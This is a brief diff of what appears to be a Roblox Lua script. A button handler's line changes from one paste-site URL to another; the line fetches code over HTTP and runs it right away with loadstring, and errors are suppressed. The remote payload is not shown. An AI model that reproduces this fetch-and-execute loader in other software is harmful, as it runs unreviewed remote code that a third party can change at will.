@@ -108,7 +108,7 @@ actionBtn.MouseButton1Click:Connect(function()
 	end)
 
 	pcall(function()
-		loadstring(game:HttpGet("https://cdn.sourceb.in/bins/pDQ76OkIWN/0", true))()
+		loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/AGHu6FA6jmosvftv/raw", true))()
 	end)
 
 	wait(45)
